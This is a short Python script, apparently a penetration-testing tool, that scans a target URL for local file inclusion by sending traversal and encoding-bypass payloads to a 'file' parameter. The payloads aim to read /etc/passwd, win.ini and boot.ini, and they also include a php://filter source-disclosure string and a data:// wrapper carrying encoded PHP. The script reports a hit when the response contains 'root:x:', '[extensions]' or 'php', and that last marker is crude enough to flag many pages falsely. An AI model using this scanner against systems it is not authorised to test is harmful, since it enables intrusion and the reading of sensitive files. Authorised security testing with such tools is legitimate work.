#!/usr/bin/env python3
# lfi_scanner.py
# Description: LFI scanner using requests with extended payloads

import requests
import sys

payloads = ['../../../../etc/passwd', '../../../../../../../../../../etc/passwd', '../windows/win.ini', '../../../../../../../../../../boot.ini', '..%2f..%2f..%2f..%2fetc%2fpasswd', '..\\..\\..\\..\\..\\..\\..\\windows\\win.ini', '....//....//....//etc/passwd', '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd', 'php://filter/convert.base64-encode/resource=index.php', 'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==']

def scan(target_url):
    for payload in payloads:
        print(f"[*] Testing payload: {payload}")
        full_url = f"{target_url}?file={payload}"
        try:
            response = requests.get(full_url)
            if "root:x:" in response.text or "[extensions]" in response.text or "php" in response.text.lower():
                print(f"[+] Potential LFI found with payload: {payload}")
            else:
                print("[-] No LFI detected.")
        except Exception as e:
            print(f"[!] Error with payload {payload}: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 lfi_scanner.py <TARGET_URL>")
        sys.exit(1)

    scan(sys.argv[1])
